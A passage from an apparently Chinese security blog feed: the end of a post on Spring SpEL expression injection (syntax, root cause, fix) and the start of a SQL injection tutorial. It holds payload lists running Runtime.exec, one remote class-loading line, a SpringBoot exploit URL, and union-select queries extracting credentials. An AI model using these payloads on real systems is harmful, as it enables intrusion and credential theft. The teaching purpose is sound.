//getValue有参数ctx，从新的容器中根据SpEL表达式获取所需的值</span><br><span class="line">        Object value = exp.getValue(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里接口<code>ExpressionParser</code>负责解析表达式字符串。上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。</p>
<h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">			&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-expression&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<h4 id="核心接口"><a href="#核心接口" class="headerlink" title="核心接口"></a>核心接口</h4><ol>
<li>解析器<code>ExpressionParser</code>，用于将字符串表达式转换为<code>Expression</code>表达式对象。</li>
<li>表达式<code>Expression</code>，最后通过它的<code>getValute</code>方法对表达式进行计算取值。</li>
<li>上下文<code>EvaluationContext</code>，通过上下文对象结合表达式来计算最后的结果。</li>
</ol>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>SpEL使用 <code>#&#123;...&#125;</code> 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：</p>
<blockquote>
<p>引用其他对象:<code>#&#123;car&#125;</code><br>引用其他对象的属性：<code>#&#123;car.brand&#125;</code><br>调用其它方法 , 还可以链式操作：<code>#&#123;car.toString()&#125;</code></p>
</blockquote>
<p>其中属性名称引用还可以用<code>$</code>符号 如：<code>$&#123;someProperty&#125;</code><br>除此以外在SpEL中，使用<code>T()</code>运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的<code>Math</code>类，我们可以像下面的示例这样使用<code>T()</code>运算符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#&#123;T(java.lang.Math)&#125; //结果会返回一个`java.lang.Math`类对象。</span><br></pre></td></tr></table></figure>

<h4 id="1、类表达式"><a href="#1、类表达式" class="headerlink" title="1、类表达式"></a>1、类表达式</h4><p>SpEL中可以使用特定的Java类型，经常用来访问Java类型中的静态属性或静态方法，需要用<code>T()</code>操作符进行声明。括号中需要包含类名的全限定名，也就是包名加上类名。唯一例外的是，SpEL内置了<code>java.lang</code>包下的类声明，也就是说<code>java.lang.String</code>可以通过<code>T(String)</code>访问，而不需要使用全限定名。<br> 因此我们通过 <code>T()</code> 调用一个类的静态方法，它将返回一个 <code>Class Object</code>，然后再调用相应的方法或属性，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc.exe\&quot;)&quot;);</span><br><span class="line">        Object value = exp.getValue();</span><br></pre></td></tr></table></figure>

<h4 id="2、方法调用"><a href="#2、方法调用" class="headerlink" title="2、方法调用"></a>2、方法调用</h4><p>使用典型的Java编程语法来调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// string literal, evaluates to &quot;bc&quot;</span><br><span class="line">String c = parser.parseExpression(&quot;&#x27;abc&#x27;.substring(2, 3)&quot;).getValue(String.class);</span><br><span class="line"></span><br><span class="line">// evaluates to true</span><br><span class="line">boolean isMember = parser.parseExpression(&quot;isMember(&#x27;Mihajlo Pupin&#x27;)&quot;).getValue(societyContext,Boolean.class);</span><br></pre></td></tr></table></figure>

<h4 id="3、调用构造函数"><a href="#3、调用构造函数" class="headerlink" title="3、调用构造函数"></a>3、调用构造函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inventor einstein = </span><br><span class="line">  p.parseExpression(&quot;new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;,&#x27;German&#x27;)&quot;).getValue(Inventor.class);</span><br><span class="line"> </span><br><span class="line">//create new inventor instance within add method of List</span><br><span class="line">p.parseExpression(&quot;Members.add(new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;, &#x27;German&#x27;))&quot;).getValue(societyContext);</span><br></pre></td></tr></table></figure>

<h4 id="4、Bean引用"><a href="#4、Bean引用" class="headerlink" title="4、Bean引用"></a>4、Bean引用</h4><p>如果解析上下文已经配置，则可以使用<code>@</code>符号从表达式中查找bean。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser(); StandardEvaluationContext context = new StandardEvaluationContext(); context.setBeanResolver(new MyBeanResolver()); </span><br><span class="line">// This will end up calling resolve(context,&quot;foo&quot;) on MyBeanResolver during evaluation </span><br><span class="line">Object bean = parser.parseExpression(&quot;@foo&quot;).getValue(context);</span><br></pre></td></tr></table></figure>

<h4 id="5、变量定义"><a href="#5、变量定义" class="headerlink" title="5、变量定义"></a>5、变量定义</h4><p>变量定义通过<code>EvaluationContext</code>接口的<code>setVariable(variableName, value)</code>方法定义；在表达式中使用<code>#variableName</code>引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象，使用<code>#root</code>引用根对象，使用<code>#this</code>引用当前上下文对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">EvaluationContext context = new StandardEvaluationContext(&quot;rui0&quot;);</span><br><span class="line">context.setVariable(&quot;variable&quot;, &quot;ruilin&quot;);</span><br><span class="line">String result1 = parser.parseExpression(&quot;#variable&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line"> </span><br><span class="line">String result2 = parser.parseExpression(&quot;#root&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line">String result3 = parser.parseExpression(&quot;#this&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure>

<h4 id="6、用户自定义的方法"><a href="#6、用户自定义的方法" class="headerlink" title="6、用户自定义的方法"></a>6、用户自定义的方法</h4><p>用户可以在SpEL注册自定义的方法，将该方法注册到<code>StandardEvaluationContext</code> 中的<code>registerFunction(String name, Method m)</code>方法。<br> 如：我们通过JAVA提供的接口实现字符串反转的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public abstract class StringUtils &#123;</span><br><span class="line"></span><br><span class="line">  public static String reverseString(String input) &#123;</span><br><span class="line">    StringBuilder backwards = new StringBuilder();</span><br><span class="line">    for (int i = 0; i &lt; input.length(); i++) </span><br><span class="line">      backwards.append(input.charAt(input.length() - 1 - i));</span><br><span class="line">    &#125;</span><br><span class="line">    return backwards.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过如下代码将方法注册到<code>StandardEvaluationContext</code>并且来使用它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">context.registerFunction(&quot;reverseString&quot;,                      StringUtils.class.getDeclaredMethod(&quot;reverseString&quot;,new Class[] &#123; String.class &#125;));</span><br><span class="line">String helloWorldReversed = parser.parseExpression(&quot;#reverseString(&#x27;hello&#x27;)&quot;).getValue(context, String.class);</span><br></pre></td></tr></table></figure>

<h4 id="7、模板表达式"><a href="#7、模板表达式" class="headerlink" title="7、模板表达式"></a>7、模板表达式</h4><p>表达式模板允许文字文本与一个或多个解析块的混合。 你可以每个解析块分隔前缀和后缀的字符。当然，常见的选择是使用<code>＃&#123;&#125;</code>作为分隔符，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(</span><br><span class="line">        &quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;,</span><br><span class="line">        new TemplateParserContext()).getValue(String.class);</span><br></pre></td></tr></table></figure>

<p>在<code>ParserContext</code>接口用于影响如何 表达被解析，以便支持所述表达模板的功能。的<code>TemplateParserContext</code>的定义如下所示</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329142052563-1185828549.png" alt="image-20220329142053427"></p>
<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>在不指定<code>EvaluationContext</code>的情况下默认采用的是<code>StandardEvaluationContext</code>，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329144847462-176527755.png" alt="image-20220329144848681"></p>
<p>看下SpEL提供的两个<code>EvaluationContext</code>的区别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</span><br><span class="line">StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</span><br></pre></td></tr></table></figure>

<p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p>
<h3 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、$&#123;12*12&#125;</span><br><span class="line">2、T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)T(Thread).sleep(10000)</span><br><span class="line">3、#this.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br><span class="line">4、new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start()</span><br><span class="line">5、T(java.lang.Runtime).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)</span><br><span class="line">6、T(Runtime).getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;)</span><br><span class="line">7、new javax.script.ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)</span><br><span class="line">8、new javax.script.ScriptEngineManager().getEngineByName(&quot;javascript&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)//调用ScriptEngine，js引擎名称可为[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</span><br><span class="line">9、new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&quot;http://127.0.0.1:8999/Exp.jar&quot;)&#125;).loadClass(&quot;Exp&quot;).getConstructors()[0].newInstance(&quot;127.0.0.1:2333&quot;)//URLClassLoader远程加载class文件，通过函数调用或者静态代码块</span><br><span class="line">10、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)  //AppClassLoader加载</span><br><span class="line">11、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.ProcessBuilder&quot;).getConstructors()[1].newInstance(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start() //AppClassLoader加载</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="SpringBoot-SpEL表达式注入漏洞"><a href="#SpringBoot-SpEL表达式注入漏洞" class="headerlink" title="SpringBoot SpEL表达式注入漏洞"></a>SpringBoot SpEL表达式注入漏洞</h4><p>原理</p>
<ul>
<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
<li>其中 ${} 包围的内容都会被  <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的  <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
</ul>
<p>环境</p>
<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce</a></p>
<p>验证</p>
<p>请求<a href="http://127.0.0.1:9091/article?id=$%7B2*2%7D">http://127.0.0.1:9091/article?id=${2*2}</a></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329171117202-1289875588.png" alt="image-20220329171118750"></p>
<p>对执行的命令进行十六进制编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">target = &#x27;calc&#x27; # 自己这里是windows环境，所以测试命令用的是calc</span><br><span class="line">for x in target:</span><br><span class="line">    result += hex(ord(x)) + &quot;,&quot;</span><br><span class="line">print(result.rstrip(&#x27;,&#x27;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将字符串格式转换成 0x** java 字节形式，因为这里会将我们的payload中的单引号和双引号进行编码，导致SpEL表达式解析失败，所以为了方便执行任意代码，可以根据String类的特性传入byte数组：</p>
<p>分析过程参考：<a href="https://www.cnblogs.com/bitterz/p/15206255.html">https://www.cnblogs.com/bitterz/p/15206255.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125; </span><br></pre></td></tr></table></figure>

<p>开启调试，造成的原因主要是在<code>ErrorMvcAutoConfiguration.java</code>中的<code>SpelView</code>类，可以看到是在<code>this.helper.replacePlaceholders(this.template, this.resolver)</code>中生成了错误页面，然后返回给result并响应</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329184704655-640679280.png" alt="image-20220329184706224"></p>
<p>此时map的值如下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329185821845-924507104.png" alt="image-20220329185823363"></p>
<p>其中template内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&lt;div id=&#x27;created&#x27;&gt;$&#123;timestamp&#125;&lt;/div&gt;&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>跟进函数replacePlaceholders</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329190024398-1003926971.png" alt="image-20220329190025935"></p>
<p>继续跟进while循环中循环解析${}中的 表 达 式 ，例如第一个解析到${timestamp}的表达式</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212020428-2110315097.png" alt="image-20220329212021872"></p>
<p>然后通过resolvePlaceholder函数进行SpEL解析，跟进即可看到通过getValue方法对SpEL表达式进行解析</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212531370-1367392607.png" alt="image-20220329212532940"></p>
<p>且<code>EvaluationContext</code>设置的为<code>StandardEvaluationContext</code>，根据前面我们可以知道它允许用户控制输入的情况下可以成功造成任意命令执行</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212843266-47854455.png" alt="image-20220329212845027"></p>
<p>当解析${message}时，我们跟踪下resolvePlaceholder函数，看看它是怎么处理的</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329214604858-144904379.png" alt="image-20220329214605998"></p>
<p>通过getValue从Context从取出message的值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329215544902-59410262.png" alt="image-20220329215545883"></p>
<p>跟进</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220031215-1991450169.png" alt="image-20220329220033014"></p>
<p>就是对message的值进行html编码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220356553-1188508612.png" alt="image-20220329220358206"></p>
<p>编码完之后，可以看到message中的双引号被转换为html编码，所以这里编写命令执行的payload，不能带单引号和双引号，这也是为什么采用byte数组传递命令的原因了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220705475-2061816981.png" alt="image-20220329220705931"></p>
<p>接着往下就又是递归函数，获取proVal中${}中的值，然后进行SpEL表达式解析</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221109578-1370501255.png" alt="image-20220329221111197"></p>
<p>往下，就是得到${}中的值，然后就是调用resolvePlaceholder进行解析</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221432770-915349157.png" alt="image-20220329221434377"></p>
<p>跟下，执行到getValue()方法就会对传进去SpEL恶意表达式进行解析，触发命令执行，弹出计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221908395-113622263.png" alt="image-20220329221907429"></p>
<p>补丁是创建了一个新的<code>NonRecursivePropertyPlaceholderHelper</code>类，来防止递归解析路径中或者名字中含有的表达式。<br>详见： <a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p>
<p><a href="https://blog.csdn.net/qq_31481187/article/details/108025512">https://blog.csdn.net/qq_31481187/article/details/108025512</a></p>
<p><a href="https://xz.aliyun.com/t/9245#toc-11">https://xz.aliyun.com/t/9245#toc-11</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入学习</title>
    <url>/2022/03/22/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><span id="more"></span>

<h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system_user()——系统用户名</span><br><span class="line">user()——用户名</span><br><span class="line">current_user()——当前用户名</span><br><span class="line">session_user()——链接数据库的用户名</span><br><span class="line">database()——数据库名</span><br><span class="line">version()——数据库版本</span><br><span class="line">@@datadir——数据库路径</span><br><span class="line">@@basedir——数据库安装路径</span><br><span class="line">@@version_conpile_os——操作系统</span><br></pre></td></tr></table></figure>

<h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ABS(x)   返回x的绝对值</span><br><span class="line">BIN(x)   返回x的二进制（OCT返回八进制，HEX返回十六进制）</span><br><span class="line">CEILING(x)   返回大于x的最小整数值</span><br><span class="line">EXP(x)   返回值e（自然对数的底）的x次方</span><br><span class="line">FLOOR(x)   返回小于x的最大整数值</span><br><span class="line">GREATEST(x1,x2,...,xn)返回集合中最大的值</span><br><span class="line">LEAST(x1,x2,...,xn)      返回集合中最小的值</span><br><span class="line">LN(x)                    返回x的自然对数</span><br><span class="line">LOG(x,y)返回x的以y为底的对数</span><br><span class="line">MOD(x,y)                 返回x/y的模（余数）</span><br><span class="line">PI()返回pi的值（圆周率）</span><br><span class="line">RAND()返回０到１内的随机值,可以通过提供一个参数(种子)使RAND()随机数生成器生成一个指定的值。</span><br><span class="line">ROUND(x,y)返回参数x的四舍五入的有y位小数的值</span><br><span class="line">SIGN(x) 返回代表数字x的符号的值</span><br><span class="line">SQRT(x) 返回一个数的平方根</span><br><span class="line">TRUNCATE(x,y)            返回数字x截短为y位小数的结果</span><br></pre></td></tr></table></figure>

<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AVG(col)返回指定列的平均值</span><br><span class="line">COUNT(col)返回指定列中非NULL值的个数</span><br><span class="line">MIN(col)返回指定列的最小值</span><br><span class="line">MAX(col)返回指定列的最大值</span><br><span class="line">SUM(col)返回指定列的所有值之和</span><br><span class="line">GROUP_CONCAT(col) 返回由属于一组的列值连接组合而成的结果</span><br></pre></td></tr></table></figure>

<h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ASCII(char)返回字符的ASCII码值</span><br><span class="line">BIT_LENGTH(str)返回字符串的比特长度</span><br><span class="line">CONCAT(s1,s2...,sn)将s1,s2...,sn连接成字符串</span><br><span class="line">CONCAT_WS(sep,s1,s2...,sn)将s1,s2...,sn连接成字符串，并用sep字符间隔</span><br><span class="line">INSERT(str,x,y,instr) 将字符串str从第x位置开始，y个字符长的子串替换为字符串instr，返回结果</span><br><span class="line">FIND_IN_SET(str,list)分析逗号分隔的list列表，如果发现str，返回str在list中的位置</span><br><span class="line">LCASE(str)或LOWER(str) 返回将字符串str中所有字符改变为小写后的结果</span><br><span class="line">LEFT(str,x)返回字符串str中最左边的x个字符</span><br><span class="line">LENGTH(s)返回字符串str中的字符数</span><br><span class="line">LTRIM(str) 从字符串str中切掉开头的空格</span><br><span class="line">POSITION(substr,str) 返回子串substr在字符串str中第一次出现的位置</span><br><span class="line">QUOTE(str) 用反斜杠转义str中的单引号</span><br><span class="line">REPEAT(str,srchstr,rplcstr)返回字符串str重复x次的结果</span><br><span class="line">REVERSE(str) 返回颠倒字符串str的结果</span><br><span class="line">RIGHT(str,x) 返回字符串str中最右边的x个字符</span><br><span class="line">RTRIM(str) 返回字符串str尾部的空格</span><br><span class="line">STRCMP(s1,s2)比较字符串s1和s2</span><br><span class="line">TRIM(str)去除字符串首部和尾部的所有空格</span><br><span class="line">UCASE(str)或UPPER(str) 返回将字符串str中所有字符转变为大写后的结果</span><br></pre></td></tr></table></figure>

<h3 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES_ENCRYPT(str,key)  返回用密钥key对字符串str利用高级加密标准算法加密后的结果，调用AES_ENCRYPT的结果是一个二进制字符串，以BLOB类型存储</span><br><span class="line">AES_DECRYPT(str,key)  返回用密钥key对字符串str利用高级加密标准算法解密后的结果</span><br><span class="line">DECODE(str,key)   使用key作为密钥解密加密字符串str</span><br><span class="line">ENCRYPT(str,salt)   使用UNIXcrypt()函数，用关键词salt(一个可以惟一确定口令的字符串，就像钥匙一样)加密字符串str</span><br><span class="line">ENCODE(str,key)   使用key作为密钥加密字符串str，调用ENCODE()的结果是一个二进制字符串，它以BLOB类型存储</span><br><span class="line">MD5()    计算字符串str的MD5校验和</span><br><span class="line">PASSWORD(str)   返回字符串str的加密版本，这个加密过程是不可逆转的，和UNIX密码加密过程使用不同的算法。</span><br><span class="line">SHA()    计算字符串str的安全散列算法(SHA)校验和</span><br></pre></td></tr></table></figure>

<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><h3 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; </span><br><span class="line">?id=1&quot; </span><br><span class="line">?id=1&#x27;) </span><br><span class="line">?id=1&quot;) </span><br><span class="line">?id=1&#x27; or 1#</span><br><span class="line">?id=1&#x27; or 0#</span><br><span class="line">?id=1&#x27; or 1=1#</span><br><span class="line">?id=1&#x27; and 1=2#</span><br><span class="line">?id=1&#x27; and sleep(5)#</span><br><span class="line">?id=1&#x27; and 1=2 or &#x27; </span><br><span class="line">?id=1\</span><br></pre></td></tr></table></figure>

<h3 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2.判断字段数"></a>2.判断字段数</h3><p>使用 order&#x2F;group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">1&#x27; order by 2#</span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">1 order by 1</span><br><span class="line">1 order by 2</span><br><span class="line">1 order by 3</span><br></pre></td></tr></table></figure>

<p>使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1 union select 1#</span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,2,3#</span><br></pre></td></tr></table></figure>

<h3 id="3-确定显示数据的字段位置"><a href="#3-确定显示数据的字段位置" class="headerlink" title="3.确定显示数据的字段位置"></a>3.确定显示数据的字段位置</h3><p>使用 union select 1,2,3,4,… 根据回显的字段数，判断回显数据的字段位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1#</span><br><span class="line">-1&#x27; union select 1,2#</span><br><span class="line">-1&#x27; union select 1,2,3#</span><br><span class="line">-1 union select 1#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,2,3#</span><br></pre></td></tr></table></figure>

<h3 id="4-在回显数据的字段上注入payload"><a href="#4-在回显数据的字段上注入payload" class="headerlink" title="4.在回显数据的字段上注入payload"></a>4.在回显数据的字段上注入payload</h3><p>在mysql 5.0版本之后，mysql默认在数据库中存放一个”<code>information_schema</code>“的数据库，在该库中，需要记住三个表名，分别是schemata、tables、columns。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库名</span><br><span class="line">-1&#x27; union select 1,2,database()--+</span><br><span class="line">-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">表名</span><br><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line">字段名</span><br><span class="line">-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">数据</span><br><span class="line">-1&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span><br></pre></td></tr></table></figure>

<p>当<code>information_schema</code>被屏蔽时，可以使用其他表：</p>
<p><strong>innodb表</strong></p>
<p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查表</span><br><span class="line">select table_name from mysql.innodb_table_stats where database_name = database(); </span><br><span class="line">select table_name from mysql.innodb_index_stats where database_name = database();</span><br><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>sys表</strong></p>
<p>sys表 在MySQL 5.7中默认存在，在mysql5.6版本以上可以手动导入，sys系统数据库结合了information_schema和performance_schema的相关数据。</p>
